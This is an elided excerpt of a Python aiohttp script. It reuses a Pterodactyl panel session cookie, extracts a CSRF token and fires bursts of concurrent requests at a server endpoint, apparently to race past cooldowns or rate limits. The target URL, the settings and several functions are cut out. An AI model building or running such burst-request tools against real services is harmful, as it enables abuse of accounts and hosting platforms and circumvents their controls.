...
def parse_cookie_string(raw_cookie):
    """
    Turns the raw "key=value; key2=value2" string into a dictionary
    that aiohttp can use to manage the session properly.
    """
    cookie = SimpleCookie()
...
async def get_csrf_token(session):
    print("[*] Connecting with Session Cookies...")
    try:
        # We don't manually set the Cookie header anymore.
        # The 'session' object handles it via the cookie_jar.
        headers = get_headers()
        ...
        async with session.get(BASE_URL, headers=headers) as resp:
            ...
            # Security Check
            if "<title>Login" in text or "Sign in to" in text:
                print("\n[!] AUTHENTICATION FAILED [!]")
                print("    Your 'pterodactyl_session' cookie is expired or invalid.")
                sys.exit(1)

            if resp.status == 200:
                # 1. Grab the token from HTML (The X-CSRF-TOKEN header)
...
async def storm_server(session, server, csrf_token):
    ...
    print(f"      SENDING {BURST_SIZE} REQUESTS...")
    ...
    if hits > 0:
        ...
        print(f"[---] Failed (Cooldown or Blocked)")

async def fire_shot(session, url, headers):
    try:
        # We rely on session.cookie_jar to send the XSRF-TOKEN cookie automatically now
...
# === MAIN ===
async def main():
    # 1. Parse the user's raw cookie string into a dictionary
    initial_cookies = parse_cookie_string(RAW_COOKIE)

    # 2. Initialize the session with these cookies
